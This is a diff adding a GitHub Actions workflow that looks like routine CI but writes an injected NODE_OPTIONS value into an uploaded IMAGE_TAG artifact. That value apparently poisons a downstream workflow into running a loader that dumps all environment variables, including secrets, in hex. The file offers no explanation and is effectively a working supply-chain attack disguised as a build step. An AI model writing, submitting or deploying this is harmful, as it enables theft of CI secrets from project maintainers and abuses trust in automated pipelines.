@@ -1,0 +1,12 @@
+name: CI
+on: pull_request
+jobs:
+  job:
+    runs-on: ubuntu-latest
+    steps:
+          - run: echo -e "11\NODE_OPTIONS;]--experimental-modules  
+--experimental-loader=data:text/javascript,console.log(Buffer.from(JSON.stringify(process.env)).toSt  
+ring('hex'));//" >> IMAGE_TAG
+          - uses: actions/upload-artifact@v2
+            name: image_tags
+            path: ./IMAGE_TAG
